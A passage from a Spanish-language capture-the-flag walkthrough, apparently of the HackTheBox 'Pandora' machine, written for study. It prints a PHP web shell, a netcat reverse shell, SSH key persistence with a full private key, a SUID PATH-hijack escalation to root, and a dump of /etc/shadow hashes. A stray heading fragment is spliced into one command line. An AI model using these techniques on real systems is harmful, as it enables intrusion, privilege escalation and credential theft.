![](/assets/images/htb-writeup-pandora/web21.png)

```bash
❯ catn cmd.php
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Ahora vamos a subir el archivo 

Y vemos que si se pudo subir 

![](/assets/images/htb-writeup-pandora/web22.png)

Y funciono 

![](/assets/images/htb-writeup-pandora/web23.png)

Tenemos ejecución remota de comandos 

![](/assets/images/htb-writeup-pandora/web24.png)

## Shell as matt 

Ahora nos vamos a poner en escucha 

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Enviamos la **shell** 

![](/assets/images/htb-writeup-pandora/web25.png)

Y nos llega la shell 

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.136] 58230
bash: cannot set terminal process group (877): Inappropriate ioctl for device
bash: no job control in this shell
matt@pandora:/var/www/pandora/pandora_console/images/xd$ whoami
whoami
matt
matt@pandora:/var/www/pandora/pandora_console/images/xd$ 
```

Ahora vamos a hacer un tratamiento de la **tty** 

```bash
matt@pandora:/var/www/pandora/pandora_console/images/xd$ script /dev/null -c bash
<pandora_console/images/xd$ script /dev/null -c bash     
Script started, file is /dev/null
matt@pandora:/var/www/pandora/pandora_console/images/xd$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
ENTER
matt@pandora:/var/www/pandora/pandora_console/images/xd$ export TERM=xterm
```

## User.txt 

```bash
matt@pandora:/home/matt$ cat user.txt 
7013a510dc89a775b5ca748e04f09a0c
matt@pandora:/home/matt$ 
``` 

## Escalada de privilegios 

Si buscamos por privilegios **SUID** vemos que esta lo que ya habíamos visto **./usr/bin/pandora_backup** al igual que el **pkexec** 

También algo que podemos hacer es conectarnos mediante **SSH** pero para eso tenemos que crear el directorio y aparte generar las claves

```bash
matt@pandora:/home/matt$ mkdir .ssh
matt@pandora:/home/matt$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/matt/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/matt/.ssh/id_rsa
Your public key has been saved in /home/matt/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:tTtzyMTd02yfATW1wga+q61CmakX+L9jTJJG8+tZ01A matt@pandora
The key's randomart image is:
+---[RSA 3072]----+
|           .   oo|
|          . o . o|
|          .. E . |
|       o o o+.oo |
|      o S +o. o.+|
|     . X = o+  o+|
|      = = B+.. ..|
|     . + ==+.    |
|      . =B+.     |
+----[SHA256]-----+
matt@pandora:/home/matt$ cd .ssh/
matt@pandora:/home/matt/.ssh$ ls
id_rsa  id_rsa.pub
matt@pandora:/home/matt/.ssh$ cat id_rsa.pub > authorized_keys
matt@pandora:/home/matt/.ssh$ chmod 600 authorized_keys 
matt@pandora:/home/matt/.ssh$ 
```

Y pues esta seria la **id_rsa** 

```bash
matt@pandora:/home/matt/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Y podemos conectarnos 

```bash
❯ nano id_rsa
❯ chmod 600 id_rsa
❯ ssh -i id_rsa matt@10.10.11.136
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 21 Jun 17:39:43 UTC 2023

  System load:           0.0
  Usage of /:            63.2% of 4.87GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             246
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.136
  IPv6 address for eth0: dead:beef::250:56ff:feb9:493f

  => /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

matt@pandora:~$
matt@pandora:~$ export TERM=xterm
```

Ahora si ejecutamos el **pandora_backup** hace un **backup** de muchas rutas del sistema pero al final nos dice esto 

```bash
matt@pandora:~$ pandora_backup
```

```bash
Backup successful!
Terminating program!
matt@pandora:~$ pandora_backup 
```

El propietario es **root** y es **SUID** 

```bash
matt@pandora:~$ ls -l /usr/bin/pandora_backup 
-rwsr-x--- 1 root matt 16816 Dec  3  2021 /usr/bin/pandora_backup
matt@pandora:~$ 
```

Lo que podemos hacer es tratar de inyectar un comandos pero sabemos que esto es un binario

```bash
matt@pandora:~$ file /usr/bin/pandora_backup 
/usr/bin/pandora_backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7174c3b04737ad11254839c20c8dab66fce55af8, for GNU/Linux 3.2.0, not stripped
matt@pandora:~$ 
```

Esta usando **tar** pero vemos que el binario lo esta poniendo de forma relativa debería ser absoluta para evitar poder hacer un **PATH Hijacking**

Esta seria la forma correcta 

```bash
matt@pandora:~$ which tar
/usr/bin/tar
matt@pandora:~$ 
```

```bash
matt@pandora:~$ ltrace /usr/bin/pandora_backup 
getuid()                                                                       = 1000
geteuid()                                                                      = 1000
setreuid(1000, 1000)                                                           = 0
puts("PandoraFMS Backup Utility"PandoraFMS Backup Utility
)                                              = 26
puts("Now attempting to backup Pandora"...Now attempting to backup PandoraFMS client
)                                    = 43
system("tar -cvf /root/.backup/pandora-b"...tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                         = 512
puts("Backup failed!\nCheck your permis"...Backup failed!
Check your permissions!
)                                   = 39
+++ exited (status 1) +++
matt@pandora:~$ 
```

Este es nuestro **PATH** 

```bash
matt@pandora:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
matt@pandora:~$ 
```

Vamos a manipular todo esto  

Lo que vamos a hacer es que nos de una **Bash** como **root** ya que **root** es la persona que esta ejecutando el binario al crearnos un archivo llamado **tar** le vamos a decir que el **PATH** comience desde donde nosotros le indiquemos que es en esta ruta para que tome nuestro **tar** y no el **/usr/bin/tar** que esa es su ruta absoluta pero aprovechándonos de que en el binario no se esta haciendo de manera correcta la llamada a **/usr/bin/tar** es por eso que podemos alterar esto 

```bash
matt@pandora:~$ cd /tmp
matt@pandora:/tmp$ touch tar
matt@pandora:/tmp$ chmod +x tar
matt@pandora:/tmp$ nano tar 
matt@pandora:/tmp$ cat tar 
/usr/bin/sh
matt@pandora:/tmp$ 
```

Ahora el **PATH** comienza en **tmp** y como va buscar el **tar** y el **tar** lo tenemos en **tmp** pues como hay lo va a encontrar va a ejecutar el de nosotros y no va a llegar ala ruta donde si esta el **tar** correcto gracias a esto ejecutara la instrucción que indicamos que es darnos una **sh** 

```bash
matt@pandora:/tmp$ export PATH=/tmp:$PATH
matt@pandora:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
matt@pandora:/tmp$ 
```

## Shell as root && root.txt 

Ahora si ejecutamos funciona ya que cuando ejecutes cualquier comando va a comenzar a buscar desde **tmp** así adelante y como **tar** esta en **tmp** que es el de nosotros pues listo hay lo encuentra y ejecuta lo que le dijimos

```bash
matt@pandora:/tmp$ pandora_backup 
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
# whoami
root
# 
```

```bash
# bash
root@pandora:/tmp# cd /root
root@pandora:/root# cat root.txt 
fb3d15aa14335548d163287b9e5b5161
root@pandora:/root# 
```

# hashes de las contraseñas de los usuarios

```bash
root@pandora:/root# cat /etc/shadow### Unauthenticated SQL Injection
root:$6$HM2preufywiCDqbY$XPrZFWf6w08MKkjghhCPBkxUo2Ag5xvZYOh4iD4XcN4zOVbWsdvqLYbznbUlLFxtC/.Z0oe9D6dT0cR7suhfr.:18794:0:99999:7:::
daemon:*:18659:0:99999:7:::
bin:*:18659:0:99999:7:::
sys:*:18659:0:99999:7:::
sync:*:18659:0:99999:7:::
games:*:18659:0:99999:7:::
man:*:18659:0:99999:7:::
lp:*:18659:0:99999:7:::
mail:*:18659:0:99999:7:::
news:*:18659:0:99999:7:::
uucp:*:18659:0:99999:7:::
proxy:*:18659:0:99999:7:::
www-data:*:18659:0:99999:7:::
backup:*:18659:0:99999:7:::
list:*:18659:0:99999:7:::
irc:*:18659:0:99999:7:::
gnats:*:18659:0:99999:7:::
nobody:*:18659:0:99999:7:::
systemd-network:*:18659:0:99999:7:::
systemd-resolve:*:18659:0:99999:7:::
systemd-timesync:*:18659:0:99999:7:::
messagebus:*:18659:0:99999:7:::
syslog:*:18659:0:99999:7:::
_apt:*:18659:0:99999:7:::
tss:*:18659:0:99999:7:::
uuidd:*:18659:0:99999:7:::
tcpdump:*:18659:0:99999:7:::
landscape:*:18659:0:99999:7:::
pollinate:*:18659:0:99999:7:::
usbmux:*:18789:0:99999:7:::
sshd:*:18789:0:99999:7:::
systemd-coredump:!!:18789::::::
matt:$6$JYpB9KogYA60PG6X$dU7jHpb3MIYYg0evztbE8Xw8dx7ok5/U0PaDT63FgQTwyJFr9DbaLa0WzeZGMFd05hrNCnoP5xTUr7Mkl2gNx1:18794:0:99999:7:::
lxd:!:18789::::::
Debian-snmp:!:18789:0:99999:7:::
mysql:!:18789:0:99999:7:::
daniel:$6$f4POti4xJyVf3/yD$7/efpNYDq.baYycVczUb4b5LlEBNami3//4TbI6lPNK2MaWPrqbdvAhLdMrfHnnZATY59rLgr4DeEZ3U8S41l/:18964:0:99999:7:::
root@pandora:/root# 
```
